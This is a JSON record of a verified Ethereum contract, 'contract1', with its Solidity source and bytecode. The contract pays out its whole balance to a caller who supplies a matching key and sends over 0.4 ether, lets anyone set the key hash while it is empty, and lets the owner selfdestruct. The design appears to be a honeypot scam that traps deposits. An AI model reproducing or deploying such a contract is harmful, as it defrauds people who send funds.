{
  "address": "0xd3d06f14b8f57e98edfc2305a3531ca890b5d8bf",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "contract1",
  "compilerVersion": "v0.4.25+commit.59dbf8f1",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-04-22\n*/\n\npragma solidity ^0.4.25;\ncontract contract1\n{\n    bytes32 keyHash;\n    address owner;\n    bytes32 wallet_id = 0x7483750c06fa3c312c684385f6c2a21c71e4582bd0dbd9492b1c0cf10a199099;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function withdraw(string key) public payable\n    {\n        require(msg.sender == tx.origin);\n        if(keyHash == keccak256(abi.encodePacked(key))) {\n            if(msg.value > 0.4 ether) {\n                msg.sender.transfer(address(this).balance);\n            }\n        }\n    }\n\n    function setup_key(string key) public\n    {\n        if (keyHash == 0x0) {\n            keyHash = keccak256(abi.encodePacked(key));\n        }\n    }\n\n    function updatehash(bytes32 new_hash) public\n    {\n        if (keyHash == 0x0) {\n            keyHash = new_hash;\n        }\n    }\n\n    function clear() public\n    {\n        require(msg.sender == owner);\n        selfdestruct(owner);\n    }\n\n    function get_id() public view returns(bytes32){\n        return wallet_id;\n    }\n\n    function () public payable {\n    }\n}",
  "bytecode": "60806040527f7483750c06fa3c312c684385f6c2a21c71e4582bd0dbd9492b1c0cf10a19909960025534801561003457600080fd5b5060018054600160a060020a031916331790556103d5806100566000396000f30060806040526004361061006c5763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416632754720c811461006e57806331fb67c21461008657806352efea6e146100d25780637ccb13c4146100e7578063f43fa80514610140575b005b34801561007a57600080fd5b5061006c600435610167565b6040805160206004803580820135601f810184900484028501840190955284845261006c9436949293602493928401919081908401838280828437509497506101799650505050505050565b3480156100de57600080fd5b5061006c610293565b3480156100f357600080fd5b506040805160206004803580820135601f810184900484028501840190955284845261006c9436949293602493928401919081908401838280828437509497506102d29650505050505050565b34801561014c57600080fd5b506101556103a3565b60408051918252519081900360200190f35b60005415156101765760008190555b50565b33321461018557600080fd5b806040516020018082805190602001908083835b602083106101b85780518252601f199092019160209182019101610199565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b6020831061021b5780518252601f1990920191602091820191016101fc565b5181516020939093036101000a60001901801990911692169190911790526040519201829003909120600054141592506101769150505767058d15e176280000341115610176576040513390303180156108fc02916000818181858888f1935050505015801561028f573d6000803e3d6000fd5b5050565b60015473ffffffffffffffffffffffffffffffffffffffff1633146102b757600080fd5b60015473ffffffffffffffffffffffffffffffffffffffff16ff5b600054151561017657806040516020018082805190602001908083835b6020831061030e5780518252601f1990920191602091820191016102ef565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b602083106103715780518252601f199092019160209182019101610352565b5181516020939093036101000a6000190180199091169216919091179052604051920182900390912060005550505050565b600254905600a165627a7a72305820b12ac7ef066c9ba65384bf27aaaf2754dd6ce0376c2d5a4b5d0a8dd5a9a5d86d0029"
}